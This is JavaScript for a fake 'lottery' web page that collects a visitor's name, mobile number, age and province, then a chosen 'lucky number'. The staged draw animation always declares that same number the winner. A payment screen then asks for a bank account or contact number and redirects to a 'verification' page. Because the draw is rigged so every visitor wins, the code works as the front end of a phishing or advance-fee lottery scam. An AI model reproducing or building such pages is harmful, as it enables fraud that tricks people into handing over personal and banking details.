// === DATA STORE ===
const userData = {name:'',mobile:'',age:'',province:'',luckyNumber:''};

// === SAVE/RESTORE from sessionStorage ===
function saveData(){sessionStorage.setItem('lotteryData',JSON.stringify(userData))}
function loadData(){
 const d=sessionStorage.getItem('lotteryData');
 if(d){const p=JSON.parse(d);Object.assign(userData,p);
  if(userData.name)document.getElementById('fullName').value=userData.name;
  if(userData.mobile)document.getElementById('mobile').value=userData.mobile;
  if(userData.age)document.getElementById('age').value=userData.age;
  if(userData.province)document.getElementById('province').value=userData.province;
 }
}

// === NAVIGATION ===
function goTo(n){
 document.querySelectorAll('.screen').forEach(s=>s.classList.remove('active'));
 document.getElementById('screen'+n).classList.add('active');
 window.scrollTo(0,0);
 if(n===4)startDraw();
 if(n===5){
  document.getElementById('holderName').value=userData.name;
  togglePay();
 }
}

// === SCREEN 1: REGISTRATION ===
document.getElementById('regForm').addEventListener('submit',function(e){
 e.preventDefault();
 let valid=true;
 const name=document.getElementById('fullName').value.trim();
 const mob=document.getElementById('mobile').value.trim();
 const age=parseInt(document.getElementById('age').value);
 const prov=document.getElementById('province').value;

 document.getElementById('errName').textContent='';
 document.getElementById('errMobile').textContent='';
 document.getElementById('errAge').textContent='';
 document.getElementById('errProv').textContent='';

 if(!name){document.getElementById('errName').textContent='Please enter your full name';valid=false}
 if(!mob||mob.length<10){document.getElementById('errMobile').textContent='Please enter a valid mobile number';valid=false}
 if(!age||age<18){document.getElementById('errAge').textContent='You must be at least 18 years old';valid=false}
 if(!prov){document.getElementById('errProv').textContent='Please select your province';valid=false}

 if(valid){
  userData.name=name;userData.mobile=mob;userData.age=age;userData.province=prov;
  saveData();goTo(2);
 }
});

// === SCREEN 3: LUCKY NUMBER ===
document.getElementById('luckyForm').addEventListener('submit',function(e){
 e.preventDefault();
 const num=parseInt(document.getElementById('luckyNum').value);
 document.getElementById('errLucky').textContent='';
 if(!num||num<1||num>1000){
  document.getElementById('errLucky').textContent='Please enter a number between 1 and 1000';return;
 }
 userData.luckyNumber=num;saveData();goTo(4);
});

// === CONFETTI SYSTEM ===
let confettiInterval;
function startConfetti() {
 const canvas = document.getElementById('confettiCanvas');
 const ctx = canvas.getContext('2d');
 canvas.width = document.getElementById('drawCard').clientWidth;
 canvas.height = document.getElementById('drawCard').clientHeight;
 
 const pieces = [];
 const colors = ['#f44336', '#e91e63', '#9c27b0', '#673ab7', '#3f51b5', '#2196f3', '#03a9f4', '#00bcd4', '#009688', '#4CAF50', '#8BC34A', '#CDDC39', '#FFEB3B', '#FFC107', '#FF9800', '#FF5722'];
 
 for(let i=0; i<100; i++) {
  pieces.push({
   x: Math.random() * canvas.width,
   y: Math.random() * canvas.height - canvas.height,
   w: Math.random() * 10 + 5,
   h: Math.random() * 5 + 5,
   color: colors[Math.floor(Math.random() * colors.length)],
   vy: Math.random() * 3 + 2,
   vx: Math.random() * 2 - 1,
   rot: Math.random() * 360,
   rotSpeed: Math.random() * 10 - 5
  });
 }
 
 function render() {
  ctx.clearRect(0, 0, canvas.width, canvas.height);
  pieces.forEach(p => {
   p.y += p.vy;
   p.x += p.vx;
   p.rot += p.rotSpeed;
   if(p.y > canvas.height) p.y = -20;
   
   ctx.save();
   ctx.translate(p.x, p.y);
   ctx.rotate(p.rot * Math.PI/180);
   ctx.fillStyle = p.color;
   ctx.fillRect(-p.w/2, -p.h/2, p.w, p.h);
   ctx.restore();
  });
  confettiInterval = requestAnimationFrame(render);
 }
 render();
}

function stopConfetti() {
 cancelAnimationFrame(confettiInterval);
 const canvas = document.getElementById('confettiCanvas');
 if(canvas) {
  const ctx = canvas.getContext('2d');
  ctx.clearRect(0, 0, canvas.width, canvas.height);
 }
}

// === SCREEN 4: DRAW ANIMATION ===
let drawBallsInterval;
function startDraw(){
 const anim=document.getElementById('drawAnim');
 const result=document.getElementById('drawResult');
 anim.style.display='block';result.style.display='none';
 stopConfetti();

 const drum = document.getElementById('drum');
 drum.querySelectorAll('.ball').forEach(b => b.remove());
 
 const balls = [];
 for(let i=0; i<6; i++) {
  const ball = document.createElement('div');
  ball.className = 'ball color-' + (Math.floor(Math.random()*5)+1);
  ball.innerHTML = Math.floor(Math.random()*99)+1;
  drum.appendChild(ball);
  
  balls.push({
   el: ball,
   x: 130, y: 130,
   vx: (Math.random()-0.5)*25,
   vy: (Math.random()-0.5)*25
  });
 }
 
 function animateBalls() {
  balls.forEach(b => {
   b.x += b.vx;
   b.y += b.vy;
   
   const dist = Math.sqrt(Math.pow(b.x-130, 2) + Math.pow(b.y-130, 2));
   if(dist > 90) {
    b.vx *= -1;
    b.vy *= -1;
    b.x += b.vx;
    b.y += b.vy;
   }
   
   b.el.style.left = (b.x - 25) + 'px';
   b.el.style.top = (b.y - 25) + 'px';
  });
 }
 
 drawBallsInterval = setInterval(animateBalls, 30);

 setTimeout(()=>{
  clearInterval(drawBallsInterval);
  anim.style.display='none';
  result.style.display='block';
  document.getElementById('winningNumberSpan').textContent=userData.luckyNumber;
  document.getElementById('congratsName').textContent='CONGRATULATIONS '+userData.name.toUpperCase()+'!';
  startConfetti();
 }, 3000);
}

// === SCREEN 5: PAYMENT ===
function togglePay(){
 const m=document.querySelector('input[name="payMethod"]:checked').value;
 document.querySelectorAll('.pay-box').forEach(b=>b.classList.remove('selected'));
 document.querySelector('input[name="payMethod"]:checked').nextElementSibling.classList.add('selected');
 
 const label = document.getElementById('acctLabel');
 if(m === 'bank') {
  label.textContent = 'Bank Account Number';
 } else {
  label.textContent = 'Contact Number';
 }
}

function claimPrize(){
 window.location.href = 'verification.html';
}

// === INIT ===
loadData();
